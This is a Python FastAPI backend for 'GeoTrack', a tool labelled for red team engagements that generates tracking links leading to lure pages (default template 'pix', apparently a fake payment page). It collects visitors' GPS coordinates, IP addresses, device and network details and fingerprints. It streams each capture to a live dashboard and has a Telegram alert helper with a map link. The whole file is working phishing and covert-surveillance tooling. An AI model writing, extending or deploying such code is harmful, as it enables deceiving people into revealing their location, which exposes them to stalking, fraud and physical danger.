"""
GeoTrack — Modern geolocation tracking for red team engagements
Backend API (FastAPI + WebSocket + SQLite)
"""

import os
import json
import uuid
import hashlib
import asyncio
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import sqlite3

# ─── Config ───────────────────────────────────────────────────
DB_PATH = os.getenv("GEOTRACK_DB", "geotrack.db")
BASE_DIR = Path(__file__).parent.parent
TEMPLATES_DIR = BASE_DIR / "templates"
FRONTEND_DIR = BASE_DIR / "frontend"
STATIC_DIR = BASE_DIR / "static"

app = FastAPI(title="GeoTrack", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Serve static files
app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")

# ─── Database ─────────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    return conn

def init_db():
    conn = get_db()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS campaigns (
            id TEXT PRIMARY KEY,
            name TEXT NOT NULL,
            template TEXT DEFAULT 'pix',
            created_at TEXT NOT NULL,
            active INTEGER DEFAULT 1
        );

        CREATE TABLE IF NOT EXISTS links (
            id TEXT PRIMARY KEY,
            slug TEXT UNIQUE NOT NULL,
            campaign_id TEXT NOT NULL,
            label TEXT DEFAULT '',
            created_at TEXT NOT NULL,
            FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
        );

        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            link_id TEXT NOT NULL,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            ip TEXT,
            user_agent TEXT,
            device_info TEXT,
            network_info TEXT,
            fingerprint TEXT,
            timestamp TEXT NOT NULL,
            FOREIGN KEY (link_id) REFERENCES links(id)
        );
    """)
    conn.commit()
    conn.close()

init_db()

# ─── WebSocket Manager ───────────────────────────────────────

class ConnectionManager:
    def __init__(self):
        self.connections: list[WebSocket] = []

    async def connect(self, ws: WebSocket):
        await ws.accept()
        self.connections.append(ws)

    def disconnect(self, ws: WebSocket):
        self.connections.remove(ws)

    async def broadcast(self, data: dict):
        for ws in self.connections[:]:
            try:
                await ws.send_json(data)
            except:
                self.connections.remove(ws)

manager = ConnectionManager()

# ─── WebSocket Endpoint ──────────────────────────────────────

@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket):
    await manager.connect(ws)
    try:
        while True:
            await ws.receive_text()
    except WebSocketDisconnect:
        manager.disconnect(ws)

# ─── API: Campaigns ──────────────────────────────────────────

@app.post("/api/campaigns")
async def create_campaign(request: Request):
    data = await request.json()
    campaign_id = uuid.uuid4().hex[:12]
    now = datetime.now(timezone.utc).isoformat()
    conn = get_db()
    conn.execute(
        "INSERT INTO campaigns (id, name, template, created_at) VALUES (?, ?, ?, ?)",
        (campaign_id, data.get("name", "Nova Campanha"), data.get("template", "pix"), now)
    )
    conn.commit()
    conn.close()
    return {"id": campaign_id, "name": data.get("name"), "created_at": now}

@app.get("/api/campaigns")
async def list_campaigns():
    conn = get_db()
    rows = conn.execute("""
        SELECT c.*, COUNT(DISTINCT l.id) as link_count, COUNT(h.id) as hit_count
        FROM campaigns c
        LEFT JOIN links l ON l.campaign_id = c.id
        LEFT JOIN hits h ON h.link_id = l.id
        GROUP BY c.id
        ORDER BY c.created_at DESC
    """).fetchall()
    conn.close()
    return [dict(r) for r in rows]

@app.delete("/api/campaigns/{campaign_id}")
async def delete_campaign(campaign_id: str):
    conn = get_db()
    conn.execute("DELETE FROM hits WHERE link_id IN (SELECT id FROM links WHERE campaign_id = ?)", (campaign_id,))
    conn.execute("DELETE FROM links WHERE campaign_id = ?", (campaign_id,))
    conn.execute("DELETE FROM campaigns WHERE id = ?", (campaign_id,))
    conn.commit()
    conn.close()
    return {"deleted": True}

# ─── API: Links ──────────────────────────────────────────────

@app.post("/api/links")
async def create_link(request: Request):
    data = await request.json()
    link_id = uuid.uuid4().hex[:12]
    slug = uuid.uuid4().hex[:8]
    now = datetime.now(timezone.utc).isoformat()
    conn = get_db()
    conn.execute(
        "INSERT INTO links (id, slug, campaign_id, label, created_at) VALUES (?, ?, ?, ?, ?)",
        (link_id, slug, data["campaign_id"], data.get("label", ""), now)
    )
    conn.commit()
    conn.close()
    return {"id": link_id, "slug": slug, "created_at": now}

@app.get("/api/links/{campaign_id}")
async def list_links(campaign_id: str):
    conn = get_db()
    rows = conn.execute("""
        SELECT l.*, COUNT(h.id) as hit_count
        FROM links l
        LEFT JOIN hits h ON h.link_id = l.id
        WHERE l.campaign_id = ?
        GROUP BY l.id
        ORDER BY l.created_at DESC
    """, (campaign_id,)).fetchall()
    conn.close()
    return [dict(r) for r in rows]

# ─── API: Hits ───────────────────────────────────────────────

@app.get("/api/hits")
async def list_hits(campaign_id: Optional[str] = None, limit: int = 100):
    conn = get_db()
    if campaign_id:
        rows = conn.execute("""
            SELECT h.*, l.slug, l.label, l.campaign_id, c.name as campaign_name
            FROM hits h
            JOIN links l ON h.link_id = l.id
            JOIN campaigns c ON l.campaign_id = c.id
            WHERE l.campaign_id = ?
            ORDER BY h.timestamp DESC LIMIT ?
        """, (campaign_id, limit)).fetchall()
    else:
        rows = conn.execute("""
            SELECT h.*, l.slug, l.label, l.campaign_id, c.name as campaign_name
            FROM hits h
            JOIN links l ON h.link_id = l.id
            JOIN campaigns c ON l.campaign_id = c.id
            ORDER BY h.timestamp DESC LIMIT ?
        """, (limit,)).fetchall()
    conn.close()
    return [dict(r) for r in rows]

@app.get("/api/stats")
async def get_stats():
    conn = get_db()
    stats = {
        "total_campaigns": conn.execute("SELECT COUNT(*) FROM campaigns").fetchone()[0],
        "total_links": conn.execute("SELECT COUNT(*) FROM links").fetchone()[0],
        "total_hits": conn.execute("SELECT COUNT(*) FROM hits").fetchone()[0],
        "today_hits": conn.execute(
            "SELECT COUNT(*) FROM hits WHERE timestamp >= date('now')"
        ).fetchone()[0],
    }
    conn.close()
    return stats

# ─── Tracking: Landing Page ──────────────────────────────────

@app.get("/t/{slug}")
async def tracking_page(slug: str, request: Request):
    conn = get_db()
    link = conn.execute("SELECT l.*, c.template FROM links l JOIN campaigns c ON l.campaign_id = c.id WHERE l.slug = ?", (slug,)).fetchone()
    conn.close()

    if not link:
        raise HTTPException(status_code=404, detail="Not found")

    template_name = link["template"] or "pix"
    template_file = TEMPLATES_DIR / f"{template_name}.html"

    if not template_file.exists():
        template_file = TEMPLATES_DIR / "pix.html"

    html = template_file.read_text(encoding="utf-8")
    html = html.replace("{{SLUG}}", slug)
    return HTMLResponse(html)

# ─── Tracking: Collect Data ──────────────────────────────────

@app.post("/api/collect/{slug}")
async def collect_data(slug: str, request: Request):
    conn = get_db()
    link = conn.execute("SELECT * FROM links WHERE slug = ?", (slug,)).fetchone()
    if not link:
        conn.close()
        return JSONResponse({"status": "ok"})

    data = await request.json()
    now = datetime.now(timezone.utc).isoformat()
    client_ip = request.headers.get("X-Forwarded-For", request.client.host)

    conn.execute("""
        INSERT INTO hits (link_id, latitude, longitude, accuracy, ip, user_agent, device_info, network_info, fingerprint, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        link["id"],
        data.get("lat"),
        data.get("lon"),
        data.get("accuracy"),
        client_ip,
        data.get("user_agent", ""),
        json.dumps(data.get("device", {})),
        json.dumps(data.get("network", {})),
        data.get("fingerprint", ""),
        now
    ))
    conn.commit()
    conn.close()

    # Broadcast to dashboard via WebSocket
    hit_data = {
        "event": "new_hit",
        "slug": slug,
        "label": link["label"],
        "lat": data.get("lat"),
        "lon": data.get("lon"),
        "accuracy": data.get("accuracy"),
        "ip": client_ip,
        "user_agent": data.get("user_agent", ""),
        "device": data.get("device", {}),
        "network": data.get("network", {}),
        "timestamp": now
    }
    await manager.broadcast(hit_data)

    return JSONResponse({"status": "ok"})

# ─── Dashboard ────────────────────────────────────────────────

@app.get("/")
async def dashboard():
    html = (FRONTEND_DIR / "dashboard.html").read_text(encoding="utf-8")
    return HTMLResponse(html)

# ─── Webhook / Notifications (Telegram) ──────────────────────

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")

async def send_telegram(hit: dict):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    import httpx
    msg = (
        f"🎯 *Novo Hit!*\n"
        f"📍 Lat: `{hit.get('lat')}` Lon: `{hit.get('lon')}`\n"
        f"🎯 Precisão: {hit.get('accuracy', 'N/A')}m\n"
        f"🔗 Slug: `{hit.get('slug')}`\n"
        f"📱 {hit.get('user_agent', '')[:60]}\n"
        f"🌐 IP: `{hit.get('ip')}`\n"
        f"🗺 [Ver no Mapa](https://maps.google.com/?q={hit.get('lat')},{hit.get('lon')})"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    async with httpx.AsyncClient() as client:
        await client.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": msg,
            "parse_mode": "Markdown"
        })
